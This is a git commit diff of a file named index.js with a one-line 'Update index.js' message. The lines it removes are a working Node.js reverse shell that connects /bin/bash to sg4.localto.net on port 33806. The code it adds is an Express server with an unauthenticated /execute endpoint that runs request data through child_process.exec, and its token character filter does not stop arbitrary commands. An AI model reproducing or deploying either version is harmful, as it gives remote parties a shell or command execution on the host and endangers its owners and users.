70940c34524273aed49c368e60300b963da91a66
lmqvn <138847537+lmqvn@users.noreply.github.com>
2023-07-20 21:46:25 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,34 @@
-var net = require("net"), sh = require("child_process").exec("/bin/bash");
-var client = new net.Socket();
-client.connect(33806, "sg4.localto.net", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
-sh.stderr.pipe(client);});
+const express = require('express');
+const bodyParser = require('body-parser');
+const { exec } = require('child_process');
+
+const app = express();
+const port = 3000;
+
+// Parse JSON request body using body-parser
+app.use(bodyParser.json());
+
+app.post('/execute', (req, res) => {
+  const { data } = req.body;
+  if (!data) {
+    return res.status(400).json({ error: 'Missing data field in the request body.' });
+  }
+
+  // Sanitize the input (remove potentially dangerous characters)
+  const sanitizedData = data.replace(/[&|;$<>()'"`\\]/g, '');
+
+  // Execute the command (e.g., 'whoami')
+  exec(sanitizedData, (error, stdout, stderr) => {
+    if (error) {
+      console.error('Error executing the command:', error.message);
+      return res.status(500).json({ error: 'An error occurred while executing the command.' });
+    }
+
+    // Return the command output
+    return res.json({ output: stdout });
+  });
+});
+
+app.listen(port, () => {
+  console.log(`Server is running on http://localhost:${port}`);
+});
